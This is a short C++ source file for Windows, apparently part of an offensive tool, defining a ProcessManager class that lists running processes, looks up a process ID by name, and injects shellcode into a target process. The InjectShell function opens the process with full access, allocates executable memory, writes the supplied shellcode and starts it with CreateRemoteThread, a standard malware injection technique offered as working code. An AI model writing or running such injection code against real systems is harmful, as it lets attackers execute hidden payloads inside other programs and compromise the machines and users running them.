#include "ProcessManager.h"
#include <TlHelp32.h>
#undef UNICODE
#undef _UNICODE

std::string ProcessManager::ProcessList() {
	std::string list = "";
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Snap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(Snap, &pe32)) {
			while (Process32Next(Snap, &pe32)) {
				list.append((CHAR*)pe32.szExeFile);
				list.append("\n");
			}
		}
	}
	return list;
}

bool ProcessManager::InjectShell(DWORD pid, std::string shell) {
	bool result = false;
	printf("Shellcode: %s", shell.c_str());
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	LPVOID addr = VirtualAllocEx(hProc, 0, shell.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (addr) {
		if (WriteProcessMemory(hProc, addr, shell.c_str(), shell.size(), 0)) {
			printf("espacio alocado perfectamente: %-016p\n", addr);
			getchar();
			if (CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)addr, 0, 0, 0) != NULL) {
				result = true;
			}
		}
	}
	return result;
}

DWORD ProcessManager::PidByName(std::string name) {
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Snap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(Snap, &pe32)) {
			while (Process32Next(Snap, &pe32)) {
				if (strcmp(name.c_str(), (const char*)pe32.szExeFile) == 0) {
					return pe32.th32ProcessID;
				}
			}
		}
	}
	return 0;
}